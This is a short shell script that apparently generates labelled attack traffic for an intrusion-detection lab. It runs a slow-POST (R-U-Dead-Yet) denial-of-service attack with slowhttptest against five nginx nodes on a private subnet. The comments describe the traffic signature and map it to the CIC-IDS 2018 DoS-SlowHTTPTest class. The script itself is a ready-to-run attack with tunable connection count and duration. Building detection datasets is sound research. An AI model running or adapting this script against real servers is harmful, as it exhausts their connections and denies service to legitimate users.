#!/bin/sh
# slow_body.sh - Slow POST body DoS (R-U-Dead-Yet) via slowhttptest.
#
# Sends POST requests where the body is dribbled a few bytes per tick,
# keeping nginx worker connections tied up for the full duration.
#
# OIF signature: flow_duration_s long (>60s), fwd_act_data_pkts > 0
# (POST body chunks being sent, unlike Slowloris where fwd_act_data_pkts=0),
# pkt_len_mean very small (2-10 bytes per chunk), bwd_pkts_per_sec near zero
# (server waiting for complete body before responding).
#
# Maps to CIC-IDS 2018 class DoS-SlowHTTPTest (class 7).
# All 5 nodes targeted in parallel.
CONNS=${1:-200}
DURATION=${2:-120}

VICTIMS="172.20.0.10 172.20.0.11 172.20.0.12 172.20.0.13 172.20.0.14"

echo "[attack] Slow POST body -> all nodes  $CONNS connections each  ${DURATION}s"
for ip in $VICTIMS; do
    # -B: slow body mode, -i: chunk interval, -s: Content-Length, -r: conn rate
    slowhttptest -B -c "$CONNS" -l "$DURATION" -i 10 -s 8192 -r 50 -u "http://$ip/" &
done
wait